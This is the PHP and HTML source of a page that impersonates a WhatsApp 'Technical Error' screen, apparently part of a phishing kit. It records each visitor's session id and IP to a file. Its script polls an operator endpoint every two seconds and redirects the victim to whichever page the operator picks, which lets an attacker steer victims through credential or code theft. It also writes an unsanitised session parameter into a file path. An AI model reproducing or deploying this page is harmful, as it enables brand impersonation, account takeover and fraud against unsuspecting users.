<?php
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

if (empty($sessionId) || empty($clientIp)) {
    die("Parameters missing");
}

$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'technical_error.php',
    'timestamp' => time(),
    'ip' => $clientIp
];
file_put_contents($trackingFile, json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Technical Error - WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
        }
        
        .error-card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
            border-top: 5px solid #25D366;
        }
        
        .error-icon {
            font-size: 72px;
            color: #25D366;
            margin-bottom: 20px;
            display: inline-block;
            width: 120px;
            height: 120px;
            background-color: #f0f7f1;
            border-radius: 50%;
            line-height: 120px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .error-title {
            font-size: 24px;
            font-weight: 600;
            color: #111;
            margin-bottom: 12px;
        }
        
        .error-message {
            color: #54656f;
            margin-bottom: 24px;
            font-size: 15px;
            line-height: 1.5;
        }
        
        .error-code {
            background-color: #f0f0f0;
            padding: 12px;
            border-radius: 8px;
            font-family: monospace;
            color: #666;
            margin-bottom: 24px;
            font-size: 13px;
        }
        
        .retry-button {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(37, 211, 102, 0.3);
        }
        
        .retry-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
        }
        
        .retry-button:active {
            transform: translateY(0);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .error-card {
                padding: 30px 15px;
            }
            
            .error-icon {
                font-size: 60px;
                width: 100px;
                height: 100px;
                line-height: 100px;
            }
            
            .error-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-card">
            <div class="error-icon">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            
            <div class="error-title">Technical Error</div>
            <p class="error-message">We're experiencing technical difficulties. Our team is working to fix this.</p>
            
            <div class="error-code">Error #WA-<?php echo rand(1000, 9999); ?></div>
            
            <a href="index.php?session=<?php echo htmlspecialchars($sessionId); ?>&ip=<?php echo htmlspecialchars($clientIp); ?>" class="retry-button">
                <i class="fas fa-home"></i> Back to Home
            </a>
        </div>
        
        <div class="footer">
            <p>© 2026 WhatsApp. All rights reserved.</p>
            <p><a href="#">Help Center</a> · <a href="#">Privacy</a></p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.action) {
                            if (data.action === 'custom' && data.redirect) {
                                window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                            } else {
                                window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                            }
                        }
                    })
                    .catch(error => console.error('Error checking actions:', error));
            }
            
            setInterval(checkAction, 2000);
        });
    </script>
</body>
</html>